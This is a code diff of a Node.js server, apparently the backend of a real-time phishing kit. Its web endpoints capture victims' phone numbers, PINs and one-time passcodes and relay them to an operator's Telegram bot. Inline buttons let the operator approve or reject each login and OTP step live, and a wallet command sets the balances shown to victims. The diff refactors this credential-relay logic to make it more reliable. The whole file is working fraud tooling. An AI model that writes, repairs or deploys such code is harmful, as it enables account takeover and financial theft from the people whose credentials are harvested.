+//  4. RECORD-LEVEL LOCK — once a record is marked terminal (approved/rejected)
+//     any subsequent callback for the same key is a no-op. This handles the
+//     case where the admin taps twice before the keyboard is removed.
+
+const _answeredCallbacks = new Set(); // session-scoped dedup for callback_query ids
+
+async function handleCallback(user, q) {
+  const { bot }    = user;
+  const { data, message: msg, id: qid } = q;
+  const { chat: { id: chatId }, message_id: mid } = msg;
+
+  // Rule 1 — idempotency: ignore duplicate deliveries of the same callback
+  if (_answeredCallbacks.has(qid)) return;
+  _answeredCallbacks.add(qid);
+  // Auto-evict after 10 min so the Set doesn't grow forever
+  const t = setTimeout(() => _answeredCallbacks.delete(qid), 10 * 60_000);
+  if (t.unref) t.unref();
+
+  // Rule 3 helper — fire-and-forget, never throws into our flow
+  const edit = (text) =>
+    bot.editMessageText(text, {
+      chat_id: chatId, message_id: mid, parse_mode: 'HTML',
+      reply_markup: { inline_keyboard: [] },
+    }).catch(e => logger.debug('edit skipped:', e.message));
+
+  // Rule 2 helper — ONE answer, called exactly once per handler path
+  const answer = (text, alert = false) =>
+    bot.answerCallbackQuery(qid, { text, show_alert: alert }).catch(e => logger.debug('answer:', e.message));
+
+  const parsed = parseCb(data);
+  if (!parsed) { await answer('❌ Bad data', true); return; }
+
+  const { type, action, phone, secret } = parsed;
+  const key = `${phone}-${secret}`;
+  const now = Date.now();
+
+  // ── LOGIN ──
+  if (type === 'login') {
+    const rec = user.logins.get(key);
+    if (!rec) { await answer('❌ Session not found', true); return; }
+
+    // Rule 4 — already handled
+    if (rec.approved || rec.rejected) { await answer('✅ Already processed'); return; }
+
+    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
+      Object.assign(rec, { approved: false, rejected: true, expired: true });
+      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: true, reason: null });
+      await Promise.all([
+        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
+        answer('⏰ Session expired', true),
+      ]);
+      return;
+    }
+
+    if (action === 'proceed') {
+      rec.approved = true;
+      const ret = user.verified.has(phone);
+      sseBroker.push(`login:${key}`, { approved: true, rejected: false, expired: false, reason: null });
+      await Promise.all([
+        edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>\n\n${ret ? '→ Dashboard' : '→ OTP step'}`),
+        answer('✅ Allowed!'),
+      ]);
+    } else if (action === 'invalid') {
+      Object.assign(rec, { rejected: true, reason: 'invalid' });
+      sseBroker.push(`login:${key}`, { approved: false, rejected: true, expired: false, reason: 'invalid' });
+      await Promise.all([
+        edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${secret}</code>`),
+        answer('❌ Marked invalid'),
+      ]);
+    } else {
+      await answer('❓ Unknown action');
+    }
+    return;
+  }
+
+  // ── OTP ──
+  if (type === 'otp') {
+    const rec = user.otps.get(key);
+    if (!rec) { await answer('❌ Verification not found', true); return; }
+
+    // Rule 4 — already handled
+    if (rec.status !== 'pending') { await answer('✅ Already processed'); return; }
+
+    if (now - rec.ts > CFG.APPROVAL_TIMEOUT) {
+      rec.status = 'timeout';
+      sseBroker.push(`otp:${key}`, { status: 'timeout' });
+      await Promise.all([
+        edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
+        answer('⏰ Session expired', true),
+      ]);
+      return;
+    }
+
+    if (action === 'correct') {
+      rec.status = 'approved';
+      user.verified.set(phone, { ts: now });
+      sseBroker.push(`otp:${key}`, { status: 'approved' });
+      await Promise.all([
+        edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>\n\n💡 Set wallet:\n<code>/wallet ${phone} Name 100.00 0</code>`),
+        answer('✅ Verified!'),
+      ]);
+    } else if (action === 'wrong') {
+      rec.status = 'rejected';
+      sseBroker.push(`otp:${key}`, { status: 'rejected' });
+      await Promise.all([
+        edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
+        answer('❌ Wrong OTP'),
+      ]);
+    } else if (action === 'wrongpin') {
+      rec.status = 'wrong_pin';
+      sseBroker.push(`otp:${key}`, { status: 'wrong_pin' });
+      await Promise.all([
+        edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${secret}</code>`),
+        answer('⚠️ Wrong PIN'),
+      ]);
+    } else {
+      await answer('❓ Unknown action');
+    }
+    return;
+  }
+
+  await answer('❓ Unknown type');
+}
+
+// ─── SEND TELEGRAM MESSAGE ─────────────────────────────────────────────────
+async function sendMsg(user, text, opts = {}) {
+  if (!user.bot || !user.mgr?.ok()) return { ok: false, err: 'Bot not ready' };
+  return user.tgQueue.send(async () => {
+    try {
+      await user.bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts });
+      return { ok: true };
+    } catch (e) {
+      user.lastErr = e.message;
+      logger.error(`sendMsg [${user.name}]:`, e.code, e.message);
+      const s = e.response?.statusCode;
+      if (s === 401) { user.healthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
+      if (s === 429) return { ok: false, err: 'Rate limited', retry: e.response.parameters?.retry_after || 30 };
+      return { ok: false, err: e.message };
+    }
+  });
+}
+
+// ─── LOAD USERS ────────────────────────────────────────────────────────────
 const users = new Map();
 
-const loadUsers = () => {
-  let loadedCount = 0;
-  let errorCount = 0;
+(function loadUsers() {
+  let ok = 0, fail = 0;
+  for (let i = 1; i <= CFG.MAX_USERS; i++) {
+    const link   = process.env[`USER_LINK_INSERT_${i}`];
+    const token  = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
+    const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
+    const name   = process.env[`USER_NAME_${i}`] || `User ${i}`;
+    if (!link || !token || !chatId) continue;
+    if (!/^[a-zA-Z0-9_-]+$/.test(link))     { logger.warn(`User ${i}: bad link`);   fail++; continue; }
+    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token)) { logger.warn(`User ${i}: bad token`);  fail++; continue; }
+    if (!/^-?\d+$/.test(chatId))              { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
+    if (users.has(link))                      { logger.warn(`Dup link: ${link}`);     fail++; continue; }
 
-  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
-    try {
-      const linkInsert = process.env[`USER_LINK_INSERT_${i}`];
-      const botToken = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
-      const chatId = process.env[`TELEGRAM_CHAT_ID_${i}`];
-      const userName = process.env[`USER_NAME_${i}`] || `User ${i}`;
-
-      if (!linkInsert || !botToken || !chatId) {
-        continue;
-      }
-
-      if (!/^[a-zA-Z0-9-_]+$/.test(linkInsert)) {
-        logger.warn(`Invalid link insert format for user ${i}: ${linkInsert}`);
-        errorCount++;
-        continue;
-      }
-
-      if (!/^\d+:[A-Za-z0-9_-]+$/.test(botToken)) {
-        logger.warn(`Invalid bot token format for user ${i}`);
-        errorCount++;
-        continue;
-      }
-
-      if (!/^-?\d+$/.test(chatId)) {
-        logger.warn(`Invalid chat ID format for user ${i}: ${chatId}`);
-        errorCount++;
-        continue;
-      }
-
-      if (users.has(linkInsert)) {
-        logger.warn(`Duplicate link insert detected: ${linkInsert}`);
-        errorCount++;
-        continue;
-      }
-
-      const userObj = {
-        id: i,
-        name: sanitizeInput(userName),
-        linkInsert,
-        botToken,
-        chatId,
-        bot: null,
-        isHealthy: false,
-        consecutiveErrors: 0,
-        loginNotifications: new Map(),
-        otpVerifications: new Map(),
-        walletBalances: new Map(),
-        verifiedUsers: new Map(),
-        processedRequests: new Map(),
-        errorCount: 0,
-        lastError: null,
-        lastErrorTime: 0
-      };
-
-      const botManager = new BotManager(userObj, linkInsert);
-      userObj.botManager = botManager;
-
-      users.set(linkInsert, userObj);
-      loadedCount++;
-    } catch (error) {
-      logger.error(`Error loading user ${i}:`, error.message);
-      errorCount++;
-    }
+    const u = {
+      id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
+      bot: null, healthy: false, lastErr: null,
+      logins:   new Map(),
+      otps:     new Map(),
+      wallets:  new Map(),
+      verified: new Map(),
+      dupes:    new DupeCache(),
+      tgQueue:  new TgQueue(),
+    };
+    u.mgr = new BotManager(u, link);
+    users.set(link, u);
+    ok++;
   }
+  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
+})();
 
-  logger.info(`Loaded ${loadedCount} users (${errorCount} errors)`);
-  return { loadedCount, errorCount };
-};
-
-loadUsers();
-
-// ============================================
-// STAGGERED BOT INITIALIZATION
-// ============================================
-const initializeAllBotsStaggered = async () => {
-  const userArray = Array.from(users.values());
-  
-  logger.info(`Starting staggered initialization of ${userArray.length} bots...`);
-  
-  for (let i = 0; i < userArray.length; i++) {
-    const user = userArray[i];
-    
-    logger.info(`Initializing bot ${i + 1}/${userArray.length}: ${user.name}`);
-    
-    try {
-      await user.botManager.initialize();
-    } catch (error) {
-      logger.error(`Failed to initialize ${user.name}:`, error.message);
-    }
-    
-    if (i < userArray.length - 1) {
-      await new Promise(resolve => setTimeout(resolve, CONFIG.BOT_STARTUP_DELAY));
-    }
+// ─── STAGGERED BOT INIT ────────────────────────────────────────────────────
+(async () => {
+  const arr = [...users.values()];
+  for (let i = 0; i < arr.length; i++) {
+    try   { await arr[i].mgr.init(); }
+    catch (e) { logger.error(`Init [${arr[i].name}]:`, e.message); }
+    if (i < arr.length - 1) await sleep(CFG.BOT_STARTUP_DELAY);
   }
-  
-  logger.info('All bots initialization complete');
-};
+  logger.info('All bots ready');
+})();
 
-initializeAllBotsStaggered();
-
-// ============================================
-// TELEGRAM MESSAGE SENDING
-// ============================================
-const sendTelegramMessage = async (user, message, options = {}) => {
-  return requestQueue.add(async () => {
-    try {
-      if (!user.bot || !user.botManager?.isHealthy()) {
-        return { success: false, error: 'Bot not ready' };
-      }
-
-      const truncatedMessage = truncateMessage(message);
-      
-      await user.bot.sendMessage(user.chatId, truncatedMessage, { 
-        parse_mode: 'HTML',
-        ...options 
-      });
-      
-      user.errorCount = Math.max(0, user.errorCount - 1);
-      user.consecutiveErrors = 0;
-      return { success: true };
-    } catch (error) {
-      user.errorCount++;
-      user.consecutiveErrors = (user.consecutiveErrors || 0) + 1;
-      user.lastError = error.message;
-      user.lastErrorTime = Date.now();
-      
-      logger.error(`Error sending message for ${user.name}:`, error.code, error.message);
-      
-      if (error.response?.statusCode === 401) {
-        user.isHealthy = false;
-        logger.error(`Bot authentication failed for ${user.name} - check token`);
-        return { success: false, error: 'Bot authentication failed', critical: true };
-      }
-      
-      if (error.response?.statusCode === 429) {
-        const retryAfter = error.response.parameters?.retry_after || 30;
-        logger.warn(`Rate limited for ${user.name} - retry after ${retryAfter}s`);
-        return { success: false, error: 'Rate limited', retryAfter, rateLimited: true };
-      }
-      
-      return { success: false, error: error.message };
-    }
-  });
-};
-
-// ============================================
-// CALLBACK QUERY HANDLER
-// ============================================
-async function handleCallbackQuery(user, query) {
-  const msg = query.message;
-  const data = query.data;
-  const chatId = msg.chat.id;
-  const messageId = msg.message_id;
-
-  try {
-    await user.bot.answerCallbackQuery(query.id, { text: '⏳ Processing...' }).catch(e => {
-      logger.debug(`Error answering initial callback for ${user.name}:`, e.message);
-    });
-
-    const parts = data.split('_');
-    const type = parts[0];
-    const action = parts[1];
-    
-    if (type === 'login') {
-      const phoneNumber = parts.slice(2, -1).join('_');
-      const pin = parts[parts.length - 1];
-      const loginKey = `${phoneNumber}-${pin}`;
-      const loginData = user.loginNotifications.get(loginKey);
-      
-      if (!loginData) {
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Session not found or expired', 
-          show_alert: true 
-        }).catch(e => logger.debug('Error answering callback:', e.message));
-        return;
-      }
-
-      if (Date.now() - loginData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        loginData.expired = true;
-        loginData.approved = false;
-        loginData.rejected = true;
-        loginData.rejectionReason = 'timeout';
-        
-        try {
-          await user.bot.editMessageText(
-            `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ❌ Timeout`,
-            { 
-              chat_id: chatId, 
-              message_id: messageId, 
-              parse_mode: 'HTML',
-              reply_markup: { inline_keyboard: [] }
-            }
-          );
-        } catch (editError) {
-          logger.error(`Error editing message for ${user.name}:`, editError.message);
-        }
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⏰ Session expired', 
-          show_alert: true 
-        }).catch(e => logger.debug('Error answering callback:', e.message));
-        return;
-      }
-
-      const isReturningUser = user.verifiedUsers.has(phoneNumber);
-
-      if (action === 'proceed') {
-        loginData.approved = true;
-        loginData.rejected = false;
-        
-        const statusMessage = `✅ <b>USER ALLOWED TO PROCEED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ✅ ${isReturningUser ? 'User proceeds to dashboard' : 'User proceeds to OTP'}`;
-        
-        try {
-          await user.bot.editMessageText(statusMessage, {
-            chat_id: chatId, 
-            message_id: messageId, 
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
-          });
-          
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '✅ User allowed!',
-            show_alert: false
-          }).catch(e => logger.debug('Error answering callback:', e.message));
-        } catch (editError) {
-          logger.error(`Error editing proceed message for ${user.name}:`, editError.message);
-        }
-
-      } else if (action === 'invalid') {
-        loginData.approved = false;
-        loginData.rejected = true;
-        loginData.rejectionReason = 'invalid';
-        
-        const statusMessage = `❌ <b>INVALID INFORMATION</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> ❌ Invalid credentials`;
-        
-        try {
-          await user.bot.editMessageText(statusMessage, {
-            chat_id: chatId, 
-            message_id: messageId, 
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
-          });
-          
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '❌ Marked as invalid!',
-            show_alert: false
-          }).catch(e => logger.debug('Error answering callback:', e.message));
-        } catch (editError) {
-          logger.error(`Error editing invalid message for ${user.name}:`, editError.message);
-        }
-      }
-      
-    } else if (type === 'otp') {
-      const phoneNumber = parts.slice(2, -1).join('_');
-      const otp = parts[parts.length - 1];
-      const verificationKey = `${phoneNumber}-${otp}`;
-      const otpData = user.otpVerifications.get(verificationKey);
-      
-      if (!otpData) {
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Verification not found', 
-          show_alert: true 
-        }).catch(e => logger.debug('Error answering callback:', e.message));
-        return;
-      }
-
-      if (Date.now() - otpData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        otpData.expired = true;
-        otpData.status = 'timeout';
-        
-        try {
-          await user.bot.editMessageText(
-            `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ❌ Timeout`,
-            { 
-              chat_id: chatId, 
-              message_id: messageId, 
-              parse_mode: 'HTML',
-              reply_markup: { inline_keyboard: [] }
-            }
-          );
-        } catch (editError) {
-          logger.error(`Error editing OTP timeout for ${user.name}:`, editError.message);
-        }
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⏰ Session expired', 
-          show_alert: true 
-        }).catch(e => logger.debug('Error answering callback:', e.message));
-        return;
-      }
-
-      if (action === 'correct') {
-        otpData.status = 'approved';
-        user.verifiedUsers.set(phoneNumber, { 
-          timestamp: Date.now(), 
-          lastLogin: Date.now() 
-        });
-        
-        const statusMessage = `✅ <b>EVERYTHING CORRECT</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ✅ User logged in successfully\n\n💡 Set wallet:\n<code>/wallet ${phoneNumber} Name 1250.50 5000</code>`;
-        
-        try {
-          await user.bot.editMessageText(statusMessage, {
-            chat_id: chatId, 
-            message_id: messageId, 
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
-          });
-          
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '✅ Everything correct!',
-            show_alert: false
-          }).catch(e => logger.debug('Error answering callback:', e.message));
-        } catch (editError) {
-          logger.error(`Error editing correct OTP for ${user.name}:`, editError.message);
-        }
-
-      } else if (action === 'wrong') {
-        otpData.status = 'rejected';
-        
-        const statusMessage = `❌ <b>WRONG OTP CODE</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ❌ OTP is wrong`;
-        
-        try {
-          await user.bot.editMessageText(statusMessage, {
-            chat_id: chatId, 
-            message_id: messageId, 
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
-          });
-          
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '❌ Wrong OTP!',
-            show_alert: false
-          }).catch(e => logger.debug('Error answering callback:', e.message));
-        } catch (editError) {
-          logger.error(`Error editing wrong OTP for ${user.name}:`, editError.message);
-        }
-
-      } else if (action === 'wrongpin') {
-        otpData.status = 'wrong_pin';
-        
-        const statusMessage = `⚠️ <b>WRONG PIN</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> ⚠️ PIN is wrong`;
-        
-        try {
-          await user.bot.editMessageText(statusMessage, {
-            chat_id: chatId, 
-            message_id: messageId, 
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [] }
-          });
-          
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '⚠️ Wrong PIN!',
-            show_alert: false
-          }).catch(e => logger.debug('Error answering callback:', e.message));
-        } catch (editError) {
-          logger.error(`Error editing wrong PIN for ${user.name}:`, editError.message);
-        }
-      }
-    }
-  } catch (error) {
-    logger.error(`Error in handleCallbackQuery for ${user.name}:`, error.message);
-    try {
-      await user.bot.answerCallbackQuery(query.id, { 
-        text: '❌ An error occurred', 
-        show_alert: true 
-      });
-    } catch (e) {
-      logger.error(`Error answering callback query for ${user.name}:`, e.message);
-    }
-  }
-}
-
-// ============================================
-// AUTO-CLEANUP
-// ============================================
+// ─── GC (every 15s) ────────────────────────────────────────────────────────
 setInterval(() => {
-  try {
-    const now = Date.now();
-    const timeoutThreshold = now - CONFIG.APPROVAL_TIMEOUT;
-    const deleteThreshold = now - (10 * 60 * 1000);
-    
-    users.forEach((user) => {
-      try {
-        for (const [key, value] of user.loginNotifications.entries()) {
-          if (value.timestamp < timeoutThreshold && !value.expired) {
-            value.expired = true;
-            value.approved = false;
-            value.rejected = true;
-            value.rejectionReason = 'timeout';
-          }
-        }
-        
-        for (const [key, value] of user.otpVerifications.entries()) {
-          if (value.timestamp < timeoutThreshold && !value.expired) {
-            value.expired = true;
-            value.status = 'timeout';
-          }
-        }
-        
-        for (const [key, value] of user.loginNotifications.entries()) {
-          if (value.timestamp < deleteThreshold) {
-            user.loginNotifications.delete(key);
-          }
-        }
-        
-        for (const [key, value] of user.otpVerifications.entries()) {
-          if (value.timestamp < deleteThreshold) {
-            user.otpVerifications.delete(key);
-          }
-        }
-      } catch (error) {
-        logger.error(`Cleanup error for ${user.name}:`, error.message);
+  const now    = Date.now();
+  const expire = now - CFG.APPROVAL_TIMEOUT;
+  const purge  = now - 10 * 60_000;
+
+  for (const u of users.values()) {
+    for (const [k, v] of u.logins) {
+      if (!v.expired && v.ts < expire) Object.assign(v, { approved: false, rejected: true, expired: true });
+      if (v.ts < purge) u.logins.delete(k);
+    }
+    for (const [k, v] of u.otps) {
+      if (v.status === 'pending' && v.ts < expire) {
+        v.status = 'timeout';
+        sseBroker.push(`otp:${k}`, { status: 'timeout' });
       }
-    });
-  } catch (error) {
-    logger.error('Global cleanup error:', error.message);
+      if (v.readAt && now - v.readAt > CFG.READ_TTL) { u.otps.delete(k); continue; }
+      if (v.ts < purge) u.otps.delete(k);
+    }
   }
-}, CONFIG.CLEANUP_INTERVAL);
+}, CFG.CLEANUP_INTERVAL).unref?.();
 
-// ============================================
-// HEALTH CHECK ENDPOINT
-// ============================================
-app.get('/api/health', (req, res) => {
-  try {
-    const userList = Array.from(users.values()).map(u => ({
-      name: u.name,
-      link: u.linkInsert,
-      active: !!u.bot,
-      healthy: u.isHealthy,
-      logins: u.loginNotifications.size,
-      otps: u.otpVerifications.size,
-      verified: u.verifiedUsers.size,
-      wallets: u.walletBalances.size,
-      errorCount: u.errorCount,
-      lastError: u.lastError,
-      lastErrorTime: u.lastErrorTime ? new Date(u.lastErrorTime).toISOString() : null
-    }));
-
-    const healthyCount = userList.filter(u => u.healthy).length;
-
-    res.json({ 
-      status: healthyCount > 0 ? 'ok' : 'degraded',
-      totalUsers: users.size,
-      healthyUsers: healthyCount,
-      users: userList,
-      timestamp: new Date().toISOString()
-    });
-  } catch (error) {
-    logger.error('Health check error:', error.message);
-    res.status(500).json({ 
-      status: 'error', 
-      error: error.message,
-      timestamp: new Date().toISOString()
-    });
-  }
-});
-
-// ============================================
-// DYNAMIC ROUTE CREATION
-// ============================================
-
-users.forEach((user, linkInsert) => {
-  const basePath = `/api/${linkInsert}`;
-
-  app.post(`${basePath}/check-user-status`, async (req, res) => {
-    try {
-      const { phoneNumber } = req.body;
-      
-      if (!phoneNumber) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone number required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const isVerified = user.verifiedUsers.has(phoneNumber);
-      
-      res.json({ 
-        success: true,
-        isReturningUser: isVerified,
-        message: isVerified ? 'Returning user' : 'New user'
-      });
-    } catch (error) {
-      logger.error(`check-user-status error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/get-wallet-balances`, async (req, res) => {
-    try {
-      const { phoneNumber } = req.body;
-      
-      if (!phoneNumber) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone number required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const walletData = user.walletBalances.get(phoneNumber);
-      
-      res.json({ 
-        success: true,
-        name: walletData?.name || '',
-        usd: walletData?.usd || 0.00,
-        zwg: walletData?.zwg || 0.00,
-        timestamp: walletData?.timestamp || null
-      });
-    } catch (error) {
-      logger.error(`get-wallet-balances error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/check-login-approval`, async (req, res) => {
-    try {
-      const { phoneNumber, pin } = req.body;
-      
-      if (!phoneNumber || !pin) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone and PIN required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const pinValidation = validatePin(pin);
-      if (!pinValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: pinValidation.error 
-        });
-      }
-
-      const loginKey = `${phoneNumber}-${pin}`;
-      const loginData = user.loginNotifications.get(loginKey);
-
-      if (!loginData) {
-        return res.json({ 
-          success: true, 
-          approved: false, 
-          rejected: false, 
-          expired: false, 
-          message: 'Waiting for admin' 
-        });
-      }
-
-      if (Date.now() - loginData.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        return res.json({ 
-          success: true, 
-          approved: false, 
-          rejected: true, 
-          expired: true, 
-          rejectionReason: 'timeout', 
-          message: 'Session expired' 
-        });
-      }
-
-      if (loginData.approved) {
-        return res.json({ 
-          success: true, 
-          approved: true, 
-          rejected: false, 
-          expired: false, 
-          message: 'Login approved' 
-        });
-      } else if (loginData.rejected) {
-        return res.json({ 
-          success: true, 
-          approved: false, 
-          rejected: true, 
-          expired: false, 
-          rejectionReason: loginData.rejectionReason || 'invalid', 
-          message: 'Invalid credentials' 
-        });
-      } else {
-        return res.json({ 
-          success: true, 
-          approved: false, 
-          rejected: false, 
-          expired: false, 
-          message: 'Waiting for approval' 
-        });
-      }
-    } catch (error) {
-      logger.error(`check-login-approval error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/login`, async (req, res) => {
-    try {
-      if (!user.bot) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot not configured' 
-        });
-      }
-
-      if (!user.isHealthy) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot service unavailable' 
-        });
-      }
-      
-      const { phoneNumber, pin, timestamp } = req.body;
-      
-      if (!phoneNumber || !pin) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone and PIN required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const pinValidation = validatePin(pin);
-      if (!pinValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: pinValidation.error 
-        });
-      }
-
-      const requestKey = `login-${phoneNumber}-${pin}`;
-      if (isDuplicate(user, requestKey)) {
-        return res.json({ 
-          success: true, 
-          message: 'Login sent (cached)' 
-        });
-      }
-
-      const loginKey = `${phoneNumber}-${pin}`;
-      user.loginNotifications.set(loginKey, { 
-        timestamp: Date.now(), 
-        approved: false, 
-        rejected: false, 
-        expired: false 
-      });
-
-      const message = formatLoginMessage(user, { 
-        phoneNumber, 
-        pin, 
-        timestamp: timestamp || Date.now() 
-      });
-      
-      const keyboard = {
-        inline_keyboard: [
-          [{ text: '✅ Allow to Proceed', callback_data: `login_proceed_${phoneNumber}_${pin}` }],
-          [{ text: '❌ Invalid Information', callback_data: `login_invalid_${phoneNumber}_${pin}` }]
-        ]
-      };
-      
-      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });
-
-      if (result.success) {
-        res.json({ 
-          success: true, 
-          message: 'Login sent - waiting for approval', 
-          requiresApproval: true 
-        });
-      } else {
-        res.status(500).json({ 
-          success: false, 
-          message: 'Failed to send notification', 
-          error: result.error 
-        });
-      }
-    } catch (error) {
-      logger.error(`login error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/verify-otp`, async (req, res) => {
-    try {
-      if (!user.bot) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot not configured' 
-        });
-      }
-
-      if (!user.isHealthy) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot service unavailable' 
-        });
-      }
-      
-      const { phoneNumber, otp, timestamp } = req.body;
-      
-      if (!phoneNumber || !otp) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone and OTP required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const otpValidation = validateOtp(otp);
-      if (!otpValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: otpValidation.error 
-        });
-      }
-
-      const requestKey = `otp-${phoneNumber}-${otp}`;
-      if (isDuplicate(user, requestKey)) {
-        return res.json({ 
-          success: true, 
-          message: 'OTP sent (cached)' 
-        });
-      }
-
-      const verificationKey = `${phoneNumber}-${otp}`;
-      user.otpVerifications.set(verificationKey, { 
-        status: 'pending', 
-        timestamp: Date.now(), 
-        expired: false 
-      });
-
-      const message = formatOTPMessage(user, { 
-        phoneNumber, 
-        otp, 
-        timestamp: timestamp || Date.now() 
-      });
-      
-      const keyboard = {
-        inline_keyboard: [
-          [{ text: '✅ Correct (PIN + OTP)', callback_data: `otp_correct_${phoneNumber}_${otp}` }],
-          [
-            { text: '❌ Wrong Code', callback_data: `otp_wrong_${phoneNumber}_${otp}` },
-            { text: '⚠️ Wrong PIN', callback_data: `otp_wrongpin_${phoneNumber}_${otp}` }
-          ]
-        ]
-      };
-      
-      const result = await sendTelegramMessage(user, message, { reply_markup: keyboard });
-
-      if (result.success) {
-        res.json({ 
-          success: true, 
-          message: 'OTP sent successfully' 
-        });
-      } else {
-        res.status(500).json({ 
-          success: false, 
-          message: 'Failed to send notification', 
-          error: result.error 
-        });
-      }
-    } catch (error) {
-      logger.error(`verify-otp error for ${user.name}:`, error.message);
-      res.status(500).json({ 
-        success: false, 
-        error: 'Internal server error' 
-      });
-    }
-  });
-
-  app.post(`${basePath}/check-otp-status`, async (req, res) => {
-    try {
-      const { phoneNumber, otp } = req.body;
-      
-      if (!phoneNumber || !otp) {
-        return res.status(400).json({ 
-          success: false, 
-          message: 'Phone and OTP required' 
-        });
-      }
-
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: phoneValidation.error 
-        });
-      }
-
-      const otpValidation = validateOtp(otp);
-      if (!otpValidation.valid) {
-        return res.status(400).json({ 
-          success: false, 
-          message: otpValidation.error 
-        });
-      }
-
-      const verificationKey = `${phoneNumber}-${otp}`;
-      const verification = user.otpVerifications.get(verificationKey);
-
-      if (!verification) {
-        return res.json({ 
-          success: true, 
-          status: 'pending', 
-          message: 'Waiting for verification' 
-        });
-      }
-
-      if (Date.now() - verification.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        return res.json({ 
-          success: true, 
-          status: 'timeout', 
-          message: 'Session expired' 
-        });
-      }
-
